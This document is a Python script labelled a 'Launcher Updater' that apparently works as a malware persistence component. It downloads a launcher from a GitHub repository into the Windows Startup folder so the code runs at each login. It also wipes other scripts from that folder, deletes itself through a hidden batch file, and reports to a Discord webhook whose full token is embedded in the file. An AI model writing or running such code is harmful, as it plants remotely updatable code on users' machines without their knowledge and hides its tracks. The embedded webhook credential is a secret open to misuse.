# monitor_script.py - Updates launcher, cleans up, and sends webhook
import os
import sys
import urllib.request
import requests
import json
import tempfile
import subprocess
import time
import shutil

# Discord webhook for update notifications
UPDATE_WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(status, title, description):
    """Send notification to Discord"""
    try:
        data = {
            "embeds": [{
                "title": title,
                "description": description,
                "color": 3066993 if status == "success" else 15158332,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S'),
                "footer": {"text": "Launcher Updater"}
            }]
        }
        
        response = requests.post(
            UPDATE_WEBHOOK,
            json=data,
            headers={'Content-Type': 'application/json'}
        )
        return response.status_code in [200, 204]
    except:
        return False

def clean_startup_folder():
    """Delete ALL files from startup folder except launchers"""
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        # Files to KEEP (launcher files only)
        keep_files = {'Startup.pyw', 'github_launcher.pyw', 'clean_launcher.pyw'}
        
        deleted_files = []
        
        for filename in os.listdir(startup_folder):
            filepath = os.path.join(startup_folder, filename)
            
            # Only delete specific file types
            if filename.endswith(('.log', '.txt', '.json', '.py', '.pyc', '.pyw')):
                if filename not in keep_files:
                    try:
                        if os.path.isfile(filepath):
                            os.remove(filepath)
                            deleted_files.append(filename)
                            print(f"Deleted: {filename}")
                    except:
                        pass
        
        # Also delete __pycache__ folders
        for root, dirs, files in os.walk(startup_folder, topdown=False):
            for dir_name in dirs:
                if dir_name == '__pycache__':
                    try:
                        shutil.rmtree(os.path.join(root, dir_name))
                        deleted_files.append(dir_name + '/')
                    except:
                        pass
        
        return deleted_files
        
    except Exception as e:
        print(f"Cleanup error: {e}")
        return []

def update_launcher():
    """Replace Startup.pyw with github_launcher.pyw from GitHub"""
    try:
        # GitHub URLs
        LAUNCHER_URL = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
        
        # Path to startup folder
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        target_file = os.path.join(startup_folder, "Startup.pyw")
        
        print(f"Downloading launcher from GitHub...")
        
        # Download the new launcher
        response = urllib.request.urlopen(LAUNCHER_URL, timeout=10)
        new_launcher_code = response.read().decode('utf-8')
        
        print(f"Downloaded {len(new_launcher_code)} bytes")
        
        # Check if current launcher exists
        current_exists = os.path.exists(target_file)
        
        if current_exists:
            # Read current launcher for comparison
            with open(target_file, 'r', encoding='utf-8') as f:
                current_code = f.read()
            
            # Check if update is needed
            if current_code.strip() == new_launcher_code.strip():
                print("Launcher already up to date")
                return False, "already_updated"
        
        # Write new launcher
        with open(target_file, 'w', encoding='utf-8') as f:
            f.write(new_launcher_code)
        
        print(f"✓ Launcher updated: {target_file}")
        return True, "updated"
        
    except Exception as e:
        print(f"✗ Update failed: {e}")
        return False, str(e)

def delete_this_script():
    """Delete this monitor script from startup folder"""
    try:
        # Get path of this script
        this_script = os.path.abspath(__file__)
        
        # Check if we're in startup folder
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        # Only delete if we're in startup folder
        if this_script.startswith(startup_folder):
            # Create batch file to delete this script
            batch_content = f'''@echo off
timeout /t 3 /nobreak >nul
del /f /q "{this_script}" >nul 2>nul
if exist "{this_script}" (
    del /f /q "{this_script}" >nul 2>nul
)
del "%~f0" >nul 2>nul
'''
            
            batch_path = tempfile.gettempdir() + "/delete_script.bat"
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            # Run batch file in background
            subprocess.Popen(
                ['cmd', '/c', batch_path],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            print(f"✓ Scheduled deletion of: {os.path.basename(this_script)}")
            return True
            
    except Exception as e:
        print(f"✗ Failed to schedule deletion: {e}")
    
    return False

def main():
    """Main function - cleanup, update, delete self"""
    print("=" * 50)
    print("Launcher Updater & Cleaner")
    print("=" * 50)
    
    # Step 1: Clean up startup folder
    print("\n[1/3] Cleaning startup folder...")
    deleted_files = clean_startup_folder()
    
    if deleted_files:
        print(f"Deleted {len(deleted_files)} files/folders")
        for f in deleted_files:
            print(f"  - {f}")
    
    # Step 2: Update the launcher
    print("\n[2/3] Updating launcher...")
    updated, status = update_launcher()
    
    # Step 3: Delete this script
    print("\n[3/3] Removing monitor script...")
    self_deleted = delete_this_script()
    
    # Send webhook
    print("\n[+] Sending webhook...")
    if updated:
        title = "✅ Launcher Updated Successfully"
        description = f"**Action:** Replaced Startup.pyw with github_launcher.pyw\n"
        description += f"**Status:** Updated successfully\n"
        if deleted_files:
            description += f"**Cleaned up:** {len(deleted_files)} files\n"
        description += f"**Self-removal:** {'Yes' if self_deleted else 'No'}"
    else:
        title = "ℹ️ Launcher Update Checked"
        description = f"**Action:** Launcher update check\n"
        description += f"**Status:** {status}\n"
        if deleted_files:
            description += f"**Cleaned up:** {len(deleted_files)} files"
    
    send_webhook("success" if updated else "info", title, description)
    
    print("\n" + "=" * 50)
    print("✓ Update process completed")
    print("✓ Startup folder cleaned")
    print("✓ Webhook sent")
    print("✓ This script will self-delete")
    print("=" * 50)
    
    # Small delay before exit
    time.sleep(2)

if __name__ == "__main__":
    main()
